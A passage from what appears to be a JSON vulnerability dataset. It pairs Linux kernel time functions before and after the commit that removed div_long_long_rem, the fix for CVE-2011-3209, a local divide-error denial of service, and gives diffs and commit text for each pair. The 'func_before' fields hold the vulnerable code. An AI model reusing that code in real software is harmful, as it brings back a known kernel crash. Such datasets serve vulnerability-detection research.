        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n int do_adjtimex(struct timex *txc)\n {\n-\tlong mtemp, save_adjust, rem;\n+\tlong mtemp, save_adjust;\n \ts64 freq_adj;\n \tint result;\n \n@@ -111,9 +111,7 @@\n \t\t    freq_adj += time_freq;\n \t\t    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);\n \t\t    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);\n-\t\t    time_offset = div_long_long_rem_signed(time_offset,\n-\t\t\t\t\t\t\t   NTP_INTERVAL_FREQ,\n-\t\t\t\t\t\t\t   &rem);\n+\t\t    time_offset = div_s64(time_offset, NTP_INTERVAL_FREQ);\n \t\t    time_offset <<= SHIFT_UPDATE;\n \t\t} /* STA_PLL */\n \t    } /* txc->modes & ADJ_OFFSET */",
        "diff_line_info": {
            "deleted_lines": [
                "\tlong mtemp, save_adjust, rem;",
                "\t\t    time_offset = div_long_long_rem_signed(time_offset,",
                "\t\t\t\t\t\t\t   NTP_INTERVAL_FREQ,",
                "\t\t\t\t\t\t\t   &rem);"
            ],
            "added_lines": [
                "\tlong mtemp, save_adjust;",
                "\t\t    time_offset = div_s64(time_offset, NTP_INTERVAL_FREQ);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/jiffies_to_compat_timeval",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static __inline__ void\njiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tlong rem;\n\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n\tvalue->tv_usec = rem / NSEC_PER_USEC;\n}",
        "func": "static __inline__ void\njiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tu32 rem;\n\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n\tvalue->tv_usec = rem / NSEC_PER_USEC;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n \t * one divide.\n \t */\n \tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong rem;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \tvalue->tv_usec = rem / NSEC_PER_USEC;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tlong rem;",
                "\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);"
            ],
            "added_lines": [
                "\tu32 rem;",
                "\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/jiffies_to_compat_timeval",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static inline void\njiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tlong rem;\n\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n\tvalue->tv_usec = rem / NSEC_PER_USEC;\n}",
        "func": "static inline void\njiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tu32 rem;\n\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n\tvalue->tv_usec = rem / NSEC_PER_USEC;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n \t * one divide.\n \t */\n \tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong rem;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \tvalue->tv_usec = rem / NSEC_PER_USEC;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tlong rem;",
                "\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);"
            ],
            "added_lines": [
                "\tu32 rem;",
                "\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/ns_to_timespec",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "struct timespec ns_to_timespec(const s64 nsec)\n{\n\tstruct timespec ts;\n\n\tif (!nsec)\n\t\treturn (struct timespec) {0, 0};\n\n\tts.tv_sec = div_long_long_rem_signed(nsec, NSEC_PER_SEC, &ts.tv_nsec);\n\tif (unlikely(nsec < 0))\n\t\tset_normalized_timespec(&ts, ts.tv_sec, ts.tv_nsec);\n\n\treturn ts;\n}",
        "func": "struct timespec ns_to_timespec(const s64 nsec)\n{\n\tstruct timespec ts;\n\ts32 rem;\n\n\tif (!nsec)\n\t\treturn (struct timespec) {0, 0};\n\n\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n\tif (unlikely(rem < 0)) {\n\t\tts.tv_sec--;\n\t\trem += NSEC_PER_SEC;\n\t}\n\tts.tv_nsec = rem;\n\n\treturn ts;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,13 +1,17 @@\n struct timespec ns_to_timespec(const s64 nsec)\n {\n \tstruct timespec ts;\n+\ts32 rem;\n \n \tif (!nsec)\n \t\treturn (struct timespec) {0, 0};\n \n-\tts.tv_sec = div_long_long_rem_signed(nsec, NSEC_PER_SEC, &ts.tv_nsec);\n-\tif (unlikely(nsec < 0))\n-\t\tset_normalized_timespec(&ts, ts.tv_sec, ts.tv_nsec);\n+\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n+\tif (unlikely(rem < 0)) {\n+\t\tts.tv_sec--;\n+\t\trem += NSEC_PER_SEC;\n+\t}\n+\tts.tv_nsec = rem;\n \n \treturn ts;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tts.tv_sec = div_long_long_rem_signed(nsec, NSEC_PER_SEC, &ts.tv_nsec);",
                "\tif (unlikely(nsec < 0))",
                "\t\tset_normalized_timespec(&ts, ts.tv_sec, ts.tv_nsec);"
            ],
            "added_lines": [
                "\ts32 rem;",
                "\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);",
                "\tif (unlikely(rem < 0)) {",
                "\t\tts.tv_sec--;",
                "\t\trem += NSEC_PER_SEC;",
                "\t}",
                "\tts.tv_nsec = rem;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/jiffies_to_timespec",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "void\njiffies_to_timespec(const unsigned long jiffies, struct timespec *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &value->tv_nsec);\n}",
        "func": "void\njiffies_to_timespec(const unsigned long jiffies, struct timespec *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu32 rem;\n\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n\t\t\t\t    NSEC_PER_SEC, &rem);\n\tvalue->tv_nsec = rem;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,6 +5,8 @@\n \t * Convert jiffies to nanoseconds and separate with\n \t * one divide.\n \t */\n-\tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &value->tv_nsec);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n+\t\t\t\t    NSEC_PER_SEC, &rem);\n+\tvalue->tv_nsec = rem;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tu64 nsec = (u64)jiffies * TICK_NSEC;",
                "\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &value->tv_nsec);"
            ],
            "added_lines": [
                "\tu32 rem;",
                "\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,",
                "\t\t\t\t    NSEC_PER_SEC, &rem);",
                "\tvalue->tv_nsec = rem;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/jiffies_to_timeval",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "void jiffies_to_timeval(const unsigned long jiffies, struct timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu64 nsec = (u64)jiffies * TICK_NSEC;\n\tlong tv_usec;\n\n\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tv_usec);\n\ttv_usec /= NSEC_PER_USEC;\n\tvalue->tv_usec = tv_usec;\n}",
        "func": "void jiffies_to_timeval(const unsigned long jiffies, struct timeval *value)\n{\n\t/*\n\t * Convert jiffies to nanoseconds and separate with\n\t * one divide.\n\t */\n\tu32 rem;\n\n\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n\t\t\t\t    NSEC_PER_SEC, &rem);\n\tvalue->tv_usec = rem / NSEC_PER_USEC;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,10 +4,9 @@\n \t * Convert jiffies to nanoseconds and separate with\n \t * one divide.\n \t */\n-\tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong tv_usec;\n+\tu32 rem;\n \n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tv_usec);\n-\ttv_usec /= NSEC_PER_USEC;\n-\tvalue->tv_usec = tv_usec;\n+\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n+\t\t\t\t    NSEC_PER_SEC, &rem);\n+\tvalue->tv_usec = rem / NSEC_PER_USEC;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tu64 nsec = (u64)jiffies * TICK_NSEC;",
                "\tlong tv_usec;",
                "\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tv_usec);",
                "\ttv_usec /= NSEC_PER_USEC;",
                "\tvalue->tv_usec = tv_usec;"
            ],
            "added_lines": [
                "\tu32 rem;",
                "\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,",
                "\t\t\t\t    NSEC_PER_SEC, &rem);",
                "\tvalue->tv_usec = rem / NSEC_PER_USEC;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/sgi_timer_set",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static int sgi_timer_set(struct k_itimer *timr, int flags,\n\tstruct itimerspec * new_setting,\n\tstruct itimerspec * old_setting)\n{\n\tunsigned long when, period, irqflags;\n\tint err = 0;\n\tcnodeid_t nodeid;\n\tstruct mmtimer *base;\n\tstruct rb_node *n;\n\n\tif (old_setting)\n\t\tsgi_timer_get(timr, old_setting);\n\n\tsgi_timer_del(timr);\n\twhen = timespec_to_ns(new_setting->it_value);\n\tperiod = timespec_to_ns(new_setting->it_interval);\n\n\tif (when == 0)\n\t\t/* Clear timer */\n\t\treturn 0;\n\n\tbase = kmalloc(sizeof(struct mmtimer), GFP_KERNEL);\n\tif (base == NULL)\n\t\treturn -ENOMEM;\n\n\tif (flags & TIMER_ABSTIME) {\n\t\tstruct timespec n;\n\t\tunsigned long now;\n\n\t\tgetnstimeofday(&n);\n\t\tnow = timespec_to_ns(n);\n\t\tif (when > now)\n\t\t\twhen -= now;\n\t\telse\n\t\t\t/* Fire the timer immediately */\n\t\t\twhen = 0;\n\t}\n\n\t/*\n\t * Convert to sgi clock period. Need to keep rtc_time() as near as possible\n\t * to getnstimeofday() in order to be as faithful as possible to the time\n\t * specified.\n\t */\n\twhen = (when + sgi_clock_period - 1) / sgi_clock_period + rtc_time();\n\tperiod = (period + sgi_clock_period - 1)  / sgi_clock_period;\n\n\t/*\n\t * We are allocating a local SHub comparator. If we would be moved to another\n\t * cpu then another SHub may be local to us. Prohibit that by switching off\n\t * preemption.\n\t */\n\tpreempt_disable();\n\n\tnodeid =  cpu_to_node(smp_processor_id());\n\n\t/* Lock the node timer structure */\n\tspin_lock_irqsave(&timers[nodeid].lock, irqflags);\n\n\tbase->timer = timr;\n\tbase->cpu = smp_processor_id();\n\n\ttimr->it.mmtimer.clock = TIMER_SET;\n\ttimr->it.mmtimer.node = nodeid;\n\ttimr->it.mmtimer.incr = period;\n\ttimr->it.mmtimer.expires = when;\n\n\tn = timers[nodeid].next;\n\n\t/* Add the new struct mmtimer to node's timer list */\n\tmmtimer_add_list(base);\n\n\tif (timers[nodeid].next == n) {\n\t\t/* No need to reprogram comparator for now */\n\t\tspin_unlock_irqrestore(&timers[nodeid].lock, irqflags);\n\t\tpreempt_enable();\n\t\treturn err;\n\t}\n\n\t/* We need to reprogram the comparator */\n\tif (n)\n\t\tmmtimer_disable_int(cnodeid_to_nasid(nodeid), COMPARATOR);\n\n\tmmtimer_set_next_timer(nodeid);\n\n\t/* Unlock the node timer structure */\n\tspin_unlock_irqrestore(&timers[nodeid].lock, irqflags);\n\n\tpreempt_enable();\n\n\treturn err;\n}",
        "func": "static int sgi_timer_set(struct k_itimer *timr, int flags,\n\tstruct itimerspec * new_setting,\n\tstruct itimerspec * old_setting)\n{\n\tunsigned long when, period, irqflags;\n\tint err = 0;\n\tcnodeid_t nodeid;\n\tstruct mmtimer *base;\n\tstruct rb_node *n;\n\n\tif (old_setting)\n\t\tsgi_timer_get(timr, old_setting);\n\n\tsgi_timer_del(timr);\n\twhen = timespec_to_ns(&new_setting->it_value);\n\tperiod = timespec_to_ns(&new_setting->it_interval);\n\n\tif (when == 0)\n\t\t/* Clear timer */\n\t\treturn 0;\n\n\tbase = kmalloc(sizeof(struct mmtimer), GFP_KERNEL);\n\tif (base == NULL)\n\t\treturn -ENOMEM;\n\n\tif (flags & TIMER_ABSTIME) {\n\t\tstruct timespec n;\n\t\tunsigned long now;\n\n\t\tgetnstimeofday(&n);\n\t\tnow = timespec_to_ns(&n);\n\t\tif (when > now)\n\t\t\twhen -= now;\n\t\telse\n\t\t\t/* Fire the timer immediately */\n\t\t\twhen = 0;\n\t}\n\n\t/*\n\t * Convert to sgi clock period. Need to keep rtc_time() as near as possible\n\t * to getnstimeofday() in order to be as faithful as possible to the time\n\t * specified.\n\t */\n\twhen = (when + sgi_clock_period - 1) / sgi_clock_period + rtc_time();\n\tperiod = (period + sgi_clock_period - 1)  / sgi_clock_period;\n\n\t/*\n\t * We are allocating a local SHub comparator. If we would be moved to another\n\t * cpu then another SHub may be local to us. Prohibit that by switching off\n\t * preemption.\n\t */\n\tpreempt_disable();\n\n\tnodeid =  cpu_to_node(smp_processor_id());\n\n\t/* Lock the node timer structure */\n\tspin_lock_irqsave(&timers[nodeid].lock, irqflags);\n\n\tbase->timer = timr;\n\tbase->cpu = smp_processor_id();\n\n\ttimr->it.mmtimer.clock = TIMER_SET;\n\ttimr->it.mmtimer.node = nodeid;\n\ttimr->it.mmtimer.incr = period;\n\ttimr->it.mmtimer.expires = when;\n\n\tn = timers[nodeid].next;\n\n\t/* Add the new struct mmtimer to node's timer list */\n\tmmtimer_add_list(base);\n\n\tif (timers[nodeid].next == n) {\n\t\t/* No need to reprogram comparator for now */\n\t\tspin_unlock_irqrestore(&timers[nodeid].lock, irqflags);\n\t\tpreempt_enable();\n\t\treturn err;\n\t}\n\n\t/* We need to reprogram the comparator */\n\tif (n)\n\t\tmmtimer_disable_int(cnodeid_to_nasid(nodeid), COMPARATOR);\n\n\tmmtimer_set_next_timer(nodeid);\n\n\t/* Unlock the node timer structure */\n\tspin_unlock_irqrestore(&timers[nodeid].lock, irqflags);\n\n\tpreempt_enable();\n\n\treturn err;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,8 +12,8 @@\n \t\tsgi_timer_get(timr, old_setting);\n \n \tsgi_timer_del(timr);\n-\twhen = timespec_to_ns(new_setting->it_value);\n-\tperiod = timespec_to_ns(new_setting->it_interval);\n+\twhen = timespec_to_ns(&new_setting->it_value);\n+\tperiod = timespec_to_ns(&new_setting->it_interval);\n \n \tif (when == 0)\n \t\t/* Clear timer */\n@@ -28,7 +28,7 @@\n \t\tunsigned long now;\n \n \t\tgetnstimeofday(&n);\n-\t\tnow = timespec_to_ns(n);\n+\t\tnow = timespec_to_ns(&n);\n \t\tif (when > now)\n \t\t\twhen -= now;\n \t\telse",
        "diff_line_info": {
            "deleted_lines": [
                "\twhen = timespec_to_ns(new_setting->it_value);",
                "\tperiod = timespec_to_ns(new_setting->it_interval);",
                "\t\tnow = timespec_to_ns(n);"
            ],
            "added_lines": [
                "\twhen = timespec_to_ns(&new_setting->it_value);",
                "\tperiod = timespec_to_ns(&new_setting->it_interval);",
                "\t\tnow = timespec_to_ns(&n);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/sgi_clock_get",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static int sgi_clock_get(clockid_t clockid, struct timespec *tp)\n{\n\tu64 nsec;\n\n\tnsec = rtc_time() * sgi_clock_period\n\t\t\t+ sgi_clock_offset.tv_nsec;\n\ttp->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tp->tv_nsec)\n\t\t\t+ sgi_clock_offset.tv_sec;\n\treturn 0;\n}",
        "func": "static int sgi_clock_get(clockid_t clockid, struct timespec *tp)\n{\n\tu64 nsec;\n\n\tnsec = rtc_time() * sgi_clock_period\n\t\t\t+ sgi_clock_offset.tv_nsec;\n\t*tp = ns_to_timespec(nsec);\n\ttp->tv_sec += sgi_clock_offset.tv_sec;\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,7 +4,7 @@\n \n \tnsec = rtc_time() * sgi_clock_period\n \t\t\t+ sgi_clock_offset.tv_nsec;\n-\ttp->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tp->tv_nsec)\n-\t\t\t+ sgi_clock_offset.tv_sec;\n+\t*tp = ns_to_timespec(nsec);\n+\ttp->tv_sec += sgi_clock_offset.tv_sec;\n \treturn 0;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\ttp->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tp->tv_nsec)",
                "\t\t\t+ sgi_clock_offset.tv_sec;"
            ],
            "added_lines": [
                "\t*tp = ns_to_timespec(nsec);",
                "\ttp->tv_sec += sgi_clock_offset.tv_sec;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/sgi_clock_set",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static int sgi_clock_set(clockid_t clockid, struct timespec *tp)\n{\n\n\tu64 nsec;\n\tu64 rem;\n\n\tnsec = rtc_time() * sgi_clock_period;\n\n\tsgi_clock_offset.tv_sec = tp->tv_sec - div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n\n\tif (rem <= tp->tv_nsec)\n\t\tsgi_clock_offset.tv_nsec = tp->tv_sec - rem;\n\telse {\n\t\tsgi_clock_offset.tv_nsec = tp->tv_sec + NSEC_PER_SEC - rem;\n\t\tsgi_clock_offset.tv_sec--;\n\t}\n\treturn 0;\n}",
        "func": "static int sgi_clock_set(clockid_t clockid, struct timespec *tp)\n{\n\n\tu64 nsec;\n\tu32 rem;\n\n\tnsec = rtc_time() * sgi_clock_period;\n\n\tsgi_clock_offset.tv_sec = tp->tv_sec - div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n\n\tif (rem <= tp->tv_nsec)\n\t\tsgi_clock_offset.tv_nsec = tp->tv_sec - rem;\n\telse {\n\t\tsgi_clock_offset.tv_nsec = tp->tv_sec + NSEC_PER_SEC - rem;\n\t\tsgi_clock_offset.tv_sec--;\n\t}\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,11 +2,11 @@\n {\n \n \tu64 nsec;\n-\tu64 rem;\n+\tu32 rem;\n \n \tnsec = rtc_time() * sgi_clock_period;\n \n-\tsgi_clock_offset.tv_sec = tp->tv_sec - div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tsgi_clock_offset.tv_sec = tp->tv_sec - div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \n \tif (rem <= tp->tv_nsec)\n \t\tsgi_clock_offset.tv_nsec = tp->tv_sec - rem;",
        "diff_line_info": {
            "deleted_lines": [
                "\tu64 rem;",
                "\tsgi_clock_offset.tv_sec = tp->tv_sec - div_long_long_rem(nsec, NSEC_PER_SEC, &rem);"
            ],
            "added_lines": [
                "\tu32 rem;",
                "\tsgi_clock_offset.tv_sec = tp->tv_sec - div_u64_rem(nsec, NSEC_PER_SEC, &rem);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/sgi_timer_get",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)\n{\n\n\tif (timr->it.mmtimer.clock == TIMER_OFF) {\n\t\tcur_setting->it_interval.tv_nsec = 0;\n\t\tcur_setting->it_interval.tv_sec = 0;\n\t\tcur_setting->it_value.tv_nsec = 0;\n\t\tcur_setting->it_value.tv_sec =0;\n\t\treturn;\n\t}\n\n\tns_to_timespec(cur_setting->it_interval, timr->it.mmtimer.incr * sgi_clock_period);\n\tns_to_timespec(cur_setting->it_value, (timr->it.mmtimer.expires - rtc_time())* sgi_clock_period);\n\treturn;\n}",
